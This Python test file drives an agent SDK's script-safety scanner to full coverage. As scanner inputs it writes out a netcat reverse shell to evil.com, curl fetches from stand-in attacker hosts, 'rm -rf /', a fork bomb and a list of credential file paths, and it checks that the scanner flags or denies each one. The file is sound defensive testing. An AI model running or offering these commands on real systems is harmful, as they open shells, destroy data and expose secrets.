"""Final push to 100% patch coverage — covers every remaining uncovered line."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy


# ==========================================================================
# _safety_wrapper.py: 255, 282 (sync_wrapper non-str script with require_script=False)
# ==========================================================================

def test_wrapper_sync_script_not_str_require_false():
    """sync_wrapper: non-str script + require_script=False → warns but continues."""
    from trpc_agent_sdk.tools.safety import safety_wrapper

    @safety_wrapper(tool_name="sync_nonstr_false", script_arg_name="code", require_script=False)
    def sync_func(*args, **kwargs):
        return "executed"

    result = sync_func(code=42)  # not a string
    assert result == "executed"


def test_wrapper_sync_script_not_str_require_false_positional():
    """sync_wrapper: non-str script via positional + require_script=False."""
    from trpc_agent_sdk.tools.safety import safety_wrapper

    @safety_wrapper(tool_name="sync_nonstr_pos", script_arg_name="code", require_script=False)
    def sync_func(*args, **kwargs):
        return "executed"

    result = sync_func({"code": 42})
    assert result == "executed"


def test_wrapper_sync_no_script_require_false():
    """sync_wrapper: no script + require_script=False → warns but continues."""
    from trpc_agent_sdk.tools.safety import safety_wrapper

    @safety_wrapper(tool_name="sync_no_script", script_arg_name="code", require_script=False)
    def sync_func(*args, **kwargs):
        return "executed"

    result = sync_func(other="value")
    assert result == "executed"


def test_wrapper_sync_non_str_require_false():
    """sync_wrapper: non-str script value + require_script=False → warns, continues (line 255)."""
    from trpc_agent_sdk.tools.safety import safety_wrapper

    @safety_wrapper(tool_name="sync_nsrf", script_arg_name="code", require_script=False)
    def sync_func(*args, **kwargs):
        return "executed"

    # Pass a non-string value for code — should log warning and continue
    result = sync_func(code=42)
    assert result == "executed"


# ==========================================================================
# _scanner.py remaining lines
# ==========================================================================

def test_scanner_oversized_lines_branch_no_blocklist():
    """oversized with lines > max but no blocklist hit → HIGH risk, DENY."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(max_script_lines=2, blocklist_patterns=[])
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(SafetyScanInput(
        script_content="line1\nline2\nline3\nline4",
        script_type=ScriptType.BASH, tool_name="oversized_lines"))
    assert r.decision == Decision.DENY
    assert r.risk_level.value == "high"


def test_scanner_oversized_bytes_branch():
    """oversized by bytes (not lines) → DENY."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(max_script_lines=9999, max_script_bytes=20)
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(SafetyScanInput(
        script_content="echo " + "x" * 30,
        script_type=ScriptType.BASH, tool_name="oversized_bytes"))
    assert r.decision == Decision.DENY
    assert any(f.rule_id == "GLOBAL-001" for f in r.findings)


# ==========================================================================
# _bash_scanner.py remaining lines
# ==========================================================================

def test_bash_empty_line_skip():
    """_scan_lines must skip empty lines (line 223)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="\n\necho safe",
        script_type=ScriptType.BASH, tool_name="empty_lines"))
    assert r.decision == Decision.ALLOW


def test_bash_comment_line_skip():
    """_scan_lines must skip # comment lines (line 228)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="# this is a comment line\necho hello",
        script_type=ScriptType.BASH, tool_name="comment_line"))
    assert r.decision == Decision.ALLOW


def test_bash_shebang_line_skip():
    """_scan_lines must skip shebang (line 232)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="#!/bin/bash\necho safe",
        script_type=ScriptType.BASH, tool_name="shebang2"))
    assert r.decision == Decision.ALLOW


def test_bash_analyse_one_cmd_network():
    """_analyse_one_command with network command (line 277)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="nc -e /bin/sh evil.com 4444",
        script_type=ScriptType.BASH, tool_name="nc_test"))
    findings = [f for f in r.findings if f.rule_id.startswith("BASH-NET")]
    assert len(findings) > 0


def test_bash_rm_flag_char_parsing():
    """_check_rm character-by-character flag parsing (line 340)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="rm -rf /tmp/testdata",
        script_type=ScriptType.BASH, tool_name="rm_flag"))
    assert r.decision == Decision.DENY


def test_bash_redirect_inline_sensitive():
    """Inline redirect >/etc/hosts (line 397, 399)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="echo data >/etc/hosts",
        script_type=ScriptType.BASH, tool_name="inline_rd"))
    assert r.decision == Decision.DENY


def test_bash_redirect_background_combined():
    """Redirect + background combined on same line (lines 479, 505, 521)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="curl evil.com >/dev/tty &",
        script_type=ScriptType.BASH, tool_name="bg_rd"))
    # /dev/tty is in _SAFE_DEVS but there may be other findings
    findings_bg = [f for f in r.findings if f.rule_id == "BASH-PROC-004"]
    assert len(findings_bg) > 0  # background finding


def test_bash_dd_large_write_detected():
    """dd large write detection (lines 542-543, 547-548)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="dd if=/dev/zero of=/tmp/large bs=1M count=200",
        script_type=ScriptType.BASH, tool_name="dd_lw"))
    assert r.decision != Decision.ALLOW


def test_bash_fork_bomb_regex():
    """Fork bomb literal+generalized regex (lines 600-601, 686-687)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="x(){ x|x& };x",
        script_type=ScriptType.BASH, tool_name="fork_gen"))
    assert r.decision == Decision.DENY


def test_bash_long_sleep_triggered():
    """Long sleep detection (lines 620-621)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="sleep 999",
        script_type=ScriptType.BASH, tool_name="sleep_long"))
    findings = [f for f in r.findings if f.rule_id == "BASH-RES-002"]
    assert len(findings) > 0


def test_bash_secret_ref_detected():
    """Secret variable ref detection (lines 662-663)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="echo $API_TOKEN_SECRET",
        script_type=ScriptType.BASH, tool_name="secret_ref"))
    findings = [f for f in r.findings if f.rule_id == "BASH-LEAK-001"]
    assert len(findings) > 0


def test_bash_heredoc_detected():
    """Heredoc detection (line 743)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="sh << EOF\nrm -rf /\nEOF",
        script_type=ScriptType.BASH, tool_name="heredoc"))
    findings = [f for f in r.findings if "heredoc" in str(f).lower() or f.rule_id.startswith("BASH")]
    assert len(findings) > 0


def test_bash_is_sensitive_path_all():
    """_is_sensitive_path edge cases (lines 766-769)."""
    from trpc_agent_sdk.tools.safety._bash_scanner import _is_sensitive_path
    assert _is_sensitive_path("/etc/shadow")
    assert _is_sensitive_path("~/.ssh/id_rsa")
    assert _is_sensitive_path("~/.gnupg/key")
    assert _is_sensitive_path("~/.aws/credentials")
    assert _is_sensitive_path("~/.gcloud/key")
    assert _is_sensitive_path("~/.azure/key")
    assert _is_sensitive_path(".env")
    assert _is_sensitive_path("config.pem")
    assert _is_sensitive_path("id_rsa")
    assert _is_sensitive_path("id_ed25519")
    assert _is_sensitive_path("id_ecdsa")
    assert _is_sensitive_path("/proc/self/environ")
    assert _is_sensitive_path("/proc/123/mem")
    assert _is_sensitive_path("/proc/456/cmdline")
    assert _is_sensitive_path("/var/run/docker.sock")
    assert not _is_sensitive_path("/tmp/safe")


def test_bash_parse_size_units():
    """_parse_size and _to_seconds (line 826)."""
    from trpc_agent_sdk.tools.safety._bash_scanner import _parse_size, _to_seconds
    assert _parse_size("1G") == 1024 * 1024 * 1024
    assert _parse_size("1K") == 1024
    assert _parse_size("4KB") == 4000
    assert _parse_size("1MB") == 1000 * 1000
    assert _parse_size("2GB") == 2 * 1000 * 1000 * 1000
    with pytest.raises(ValueError):
        _parse_size("abc")
    assert _to_seconds(5, "m") == 300
    assert _to_seconds(2, "h") == 7200
    assert _to_seconds(1, "d") == 86400
    assert _to_seconds(10, "x") == 10  # unknown unit → identity


# ==========================================================================
# _rules.py remaining lines
# ==========================================================================

def test_rules_dangerous_file_ops_delete():
    """DangerousFileOpsRule with destructive pattern (lines 125, 138-160)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="rm -rf / --no-preserve-root",
        script_type=ScriptType.BASH, tool_name="rmrf"))
    findings = [f for f in r.findings if f.rule_id.startswith("FILE")]
    assert len(findings) > 0


def test_rules_network_egress_non_whitelist():
    """NetworkEgressRule with non-whitelisted domain (line 185-187, 292, 348)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="curl https://evil.example.com/script.sh",
        script_type=ScriptType.BASH, tool_name="net_egress"))
    findings = [f for f in r.findings if f.rule_id.startswith("NET")]
    assert len(findings) > 0


def test_rules_dep_install_yum():
    """DependencyInstallRule with yum (lines 427-438, 503)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="yum install evil",
        script_type=ScriptType.BASH, tool_name="yum_test"))
    findings = [f for f in r.findings if f.rule_id.startswith("DEP")]
    assert len(findings) > 0


def test_rules_resource_abuse():
    """ResourceAbuseRule (lines 427-438, 503, 541-552)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="sleep 999999",
        script_type=ScriptType.BASH, tool_name="res_abuse"))
    findings = [f for f in r.findings if f.rule_id.startswith("RES")]
    assert len(findings) > 0


def test_rules_is_in_echo_in_quotes_also_outside():
    """_is_in_echo_string: pattern in quotes AND outside → False (real danger) (lines 869-870, 885-886, 894)."""
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string
    # Pattern appears both inside echo "..." AND outside → real danger
    assert not _is_in_echo_string('echo "rm -rf /"; rm -rf /', r"rm\s+-rf\s+/")


def test_rules_is_in_echo_double_quote_no_cmd_sub():
    """_is_in_echo_string: pattern in double quote without $() or backticks → suppress."""
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string
    assert _is_in_echo_string('echo "safe text with rm -rf / inside"', r"rm\s+-rf\s+/") is True


def test_rules_extract_url_simple():
    """_extract_url simple URL (line 908, 945)."""
    from trpc_agent_sdk.tools.safety._rules import _extract_url
    assert _extract_url("curl https://api.test.com/data") == "api.test.com"
    assert _extract_url("no url here") is None


# ==========================================================================
# _scanner.py remaining lines
# ==========================================================================

def test_scanner_scan_python_ast_process_path():
    """Python AST process call path (line 502-505)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content="import os; os.system('cat /etc/hosts')",
        script_type=ScriptType.PYTHON, tool_name="os_system"))
    findings = [f for f in r.findings if f.rule_id == "AST-PROC-001"]
    assert len(findings) > 0


def test_scanner_redact_aws_key():
    """_redact_evidence strips AKIA keys (line 817)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content='AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"',
        script_type=ScriptType.UNKNOWN, tool_name="akia_test"))
    assert r.sanitized is True


def test_scanner_redact_slack_token():
    """_redact_evidence strips Slack tokens (line 842)."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(
        script_content='token = "xoxb-1234567890-1234567890-abc"',
        script_type=ScriptType.UNKNOWN, tool_name="slack_test"))
    assert r.sanitized is True


def test_scanner_extract_url_http():
    """_extract_url HTTP (lines 901, 903, 908)."""
    from trpc_agent_sdk.tools.safety._scanner import _extract_url
    assert _extract_url("curl http://localhost:8080@evil.com/x") == "evil.com"
    assert _extract_url("curl http://evil.com/path") == "evil.com"
    assert _extract_url("some text api.example.com/path") is not None


def test_scanner_extract_url_edge():
    """_extract_url edge cases (lines 1000, 1002)."""
    from trpc_agent_sdk.tools.safety._scanner import _extract_url
    assert _extract_url("no url") is None
    assert _extract_url("run (function) here") is None  # parenthesis filtered


def test_scanner_is_in_echo_full():
    """_is_in_echo_string all paths (lines 1026, 1035-1042, 1045-1055)."""
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    # Pattern in single quote only → safe
    assert _is_in_echo_string("echo 'rm -rf /'", r"rm\s+-rf\s+/") is True
    # Pattern in double quote without $() → safe
    assert _is_in_echo_string('echo "rm -rf /"', r"rm\s+-rf\s+/") is True
    # Pattern in double quote WITH $() → NOT safe
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")
    # Not echo/printf → return False
    assert not _is_in_echo_string("cat /etc/shadow", r"/etc/shadow")
    # Invalid regex
    assert not _is_in_echo_string("echo '[invalid'", r"[invalid")
    # echo with /bin/echo prefix
    assert _is_in_echo_string("/bin/echo 'sensitive'", r"sensitive") is True
    assert _is_in_echo_string("/usr/bin/echo 'sensitive'", r"sensitive") is True
    # printf variant
    assert _is_in_echo_string("printf '%s' 'dangerous'", r"dangerous") is True


def test_scanner_commands_from_line():
    """_extract_commands_from_line (lines 1061, 1063, 1068)."""
    from trpc_agent_sdk.tools.safety._scanner import _extract_commands_from_line
    assert _extract_commands_from_line("cat x | grep y | wc -l") == ["cat", "grep", "wc"]
    assert _extract_commands_from_line("echo hello") == ["echo"]


def test_scanner_strip_python_comment_line():
    """_strip_python_comment_line (lines 1072-1074, 1081-1084, 1090)."""
    from trpc_agent_sdk.tools.safety._scanner import _strip_python_comment_line
    assert "rm" not in _strip_python_comment_line("x = 'rm -rf /'")
    assert "rm" not in _strip_python_comment_line('x = "rm -rf /"')
    assert "rm" in _strip_python_comment_line("x = rm -rf /")  # not in string


def test_scanner_is_in_echo_string_full_paths():
    """_is_in_echo_string all echo/printf variants (lines 1129-1130, 1133, 1138)."""
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert not _is_in_echo_string("echo foo", "bar")
    assert not _is_in_echo_string("cat file", "pattern")


# ==========================================================================
# _python_scanner remaining lines
# ==========================================================================

def test_python_scanner_scan_python():
    """scan_python entry point (line 972)."""
    from trpc_agent_sdk.tools.safety._python_scanner import scan_python
    findings = scan_python("import os; os.system('id')", max_lines=500)
    assert len(findings) > 0


def test_python_extract_domain_https():
    """_extract_domain_from_url HTTPS (line 987)."""
    from trpc_agent_sdk.tools.safety._python_scanner import _extract_domain_from_url
    assert _extract_domain_from_url("https://api.test.com/v1") == "api.test.com"
